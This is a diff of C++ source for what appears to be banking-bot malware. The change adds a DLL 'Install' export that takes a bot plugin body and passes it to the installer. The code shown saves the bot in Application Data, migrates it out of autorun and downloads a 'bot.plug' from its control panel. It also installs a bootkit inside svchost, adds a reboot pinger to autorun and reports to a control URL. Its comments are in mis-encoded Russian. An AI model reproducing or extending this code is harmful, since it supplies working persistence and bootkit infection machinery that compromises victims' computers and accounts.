@@ -384,7 +384,7 @@ static BYTE* GetBotPlug( DWORD& size )
 }
 
 //сохран€ет бот в папке Documents and Settings\username\Application Data
-static bool SavedBot()
+static bool SavedBot( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
 	PP_DPRINTF( "SavedBot: start" );
 	//сначала пытаемс€ перенести бота из автозагрузки
@@ -392,10 +392,12 @@ static bool SavedBot()
 	bool res = false;
 	DWORD sizeBot = 0;
 	BYTE* dataBot = 0;
+	bool delDataBot = false;
 	if( File::IsExists(path) ) //в автозагрузке есть бот, загружаем
 	{
 		PP_DPRINTF( "SavedBot: переносим бот из автозагрузки" );
 		dataBot = 0;//File::ReadToBufferA( path, sizeBot );
+		delDataBot = true;
 		//удал€ем
 		/*
 		pSetFileAttributesA( path, FILE_ATTRIBUTE_NORMAL ); //убираем атрибут дл€ чтени€
@@ -409,7 +411,13 @@ static bool SavedBot()
 	if( !dataBot ) //из автозагрузки не удалось перенести, качаем с админки бот плаг
 	{
 		PP_DPRINTF( "SavedBot: ставим bot.plug" );
+#ifdef BKI_PLUG
+		dataBot = bodyBotPlug;
+		sizeBot = sizeBotPlug;
+#else
 		dataBot = GetBotPlug(sizeBot);
+		delDataBot = true;
+#endif
 	}
 	if( dataBot )
 	{
@@ -418,14 +426,14 @@ static bool SavedBot()
 			BOT::SaveSettings(true, false, false);
 			res = true;
 		}
-		MemFree(dataBot);
+		if( delDataBot ) MemFree(dataBot);
 	}
 	return res;
 }
 
 // ‘-ци€, котора€ после проверок вызывает событи€ старта в процессе Explorer,
 // что в свою очередь вызывает установку BkDll
-BOOL ExplorerMain()
+BOOL ExplorerMain( BYTE* bodyBotPlug = 0, DWORD sizeBotPlug = 0 )
 {
 	BOOL ret = FALSE;
 	bool BkInstalledSuccess = false;
@@ -448,7 +456,7 @@ BOOL ExplorerMain()
 //		if ( SetupBootkit() )
 		if( MegaJump(SetupBootkitInSvchost) )
 		{
-			SavedBot();
+			SavedBot( bodyBotPlug, sizeBotPlug );
 			pSleep(10000);
 			PP_DPRINTF("ExplorerStart: add pinger to autorun...");
 			AddRebootPingToAutorun();
@@ -511,6 +519,7 @@ BOOL ExplorerMain()
 	return ret;
 }
 
+#ifndef BKI_PLUG
 
 // ‘-ци€, котора€ вызываетс€ при инжекте в другие процессы.
 // ѕровер€ет свои права и пробует их расширить дл€ 
@@ -972,5 +981,50 @@ int APIENTRY MyMain(int argc, char** argv)
 
 	return 1;
 }
+
+#else
+
+extern"C"  BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
+{
+	if( bodyBotPlug && sizeBotPlug > 0 )
+	{
+		BOT::Initialize();
+		DebugReportInit();
+
+		char statParam[256];
+		fwsprintfA pwsprintf = Get_wsprintfA();
+		char* prefix = GetNamePrefix();
+		pwsprintf( statParam, "bot.plug %s %s", prefix, PP_REPORT_URL );
+		STR::Free(prefix);
+		DebugReportSaveSettings(statParam);
+		
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("101_d"));
+
+		return ExplorerMain( bodyBotPlug, sizeBotPlug );
+	}
+	return FALSE;
+}
+
+DWORD WINAPI MyMain(HINSTANCE , DWORD reason, LPVOID )
+{
+//код дл€ тестировани€, ложитс€ вместе c bot.plug и запускаетс€ "rundll32 bki.plug,qwe"
+//	BOT::Initialize();
+//	BYTE* data;
+//	DWORD size;
+//	data = File::ReadToBufferA( "bot.plug", size );
+	switch (reason)
+	{
+		case DLL_PROCESS_ATTACH:
+//			Install( data, size );
+			break;
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+			break;
+	}
+	return TRUE;
+}
+
+#endif
 
 void main(){ };
